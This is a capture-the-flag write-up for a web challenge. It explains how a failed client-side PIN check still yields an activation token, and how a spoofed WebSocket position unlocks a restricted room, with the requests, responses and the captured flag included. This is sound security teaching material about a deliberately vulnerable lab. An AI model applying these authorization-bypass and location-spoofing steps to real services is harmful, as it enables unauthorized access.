# Inside the Cordon

**Author:** mar

**Web** · 270 pts

**TL;DR.** The station PIN is checked in the browser, and the server hands back a signed `attempt`
even when the PIN is wrong. `/api/station/activate` accepts that failure token without ever asking
whether the PIN was correct. Once activated, the station reports a scripted position 412.8 m
outside the 75 m cordon; a single `position.update` at the cordon centre makes `cordon-seven`
eligible, and `room.join` returns the restricted briefing with the clearance token.

## Solve

**Session.** `GET /` issues a `station=<token>` cookie; every station endpoint answers
`401 SESSION_REQUIRED` without it.

**The PIN gate is client-side.** `POST /api/station/pin-check {"pin":"000000"}` answers
`{"success":false,"code":"PIN_MISMATCH","attempt":"...","expires_in_ms":60000}` — the attempt is
issued on failure. `app.js` says it out loud: *"Deliberately wrong trust boundary: the browser's
local branch decides whether to activate."* The failed attempt is a valid input to
`POST /api/station/activate`:

```json
{"success":true,"code":"STATION_ACTIVE","cap":"...","lat_e6":-47203945,
 "lon_e6":-126300000,"radius_m":75,"room":"cordon-seven"}
```

The PIN is never actually needed; recovering a valid six-digit PIN is a red herring.

**Channel.** `WS /ws`. The first frame is `station.authenticate {sequence:1, cap}`; the reply
`station.accepted` carries `freshness_ms:10000`, `eligibility_ttl_ms:60000`, `limit:120`,
`window_ms:60000`.

**Position.** The station is scripted to report `-47.200610, -126.302400` — 412.8 m from the cordon
centre, outside the 75 m radius. That keeps `eligible_room` null and `room.join` fails
`NOT_ELIGIBLE`. Reporting `-47.203945, -126.300000` (the centre handed back by `/api/station/activate`)
yields `inside:true, distance_m:0.0, eligible_room:"cordon-seven"`.

**Join.** `{"type":"room.join","sequence":<next>,"room":"cordon-seven"}` returns `room.snapshot`:

```
RESTRICTED | Convoy diversion confirmed. Preserve the access chain.
clearance_token: CSCTF{PNRdjjbuI2xkP9yd2l1En04C}
```

Controls that pinned the protocol: no cookie → `401 SESSION_REQUIRED`; outside-cordon position →
`inside:false`, `distance_m:412.8`, `NOT_ELIGIBLE`; a stale `observed_at_ms` (>10 s) →
`STALE_POSITION`; unknown frame types → `BAD_MESSAGE`; `room.join` with no room → `UNKNOWN_ROOM`.
Rate limits: pin-check 5/600 s, activate 5/60 s, channel 120 frames/60 s.

**Flag:** `CSCTF{PNRdjjbuI2xkP9yd2l1En04C}`

**Evidence.** The chain, coordinates, control matrix and flag come from the live-solve workspace
`ctf-vicinity/WRITEUP.md` (written 16:34Z) and its runner [solve_vicinity.py](solve_vicinity.py).
CTFd recorded the solve at 2026-11-06T16:35:20Z. The captured station page and `app.js` are in
[files/index.html](files/index.html) and [files/app.js](files/app.js); the instance is gone and the
accepted `room.snapshot` response was not separately logged, so the flag literal rests on that
contemporaneous writeup.
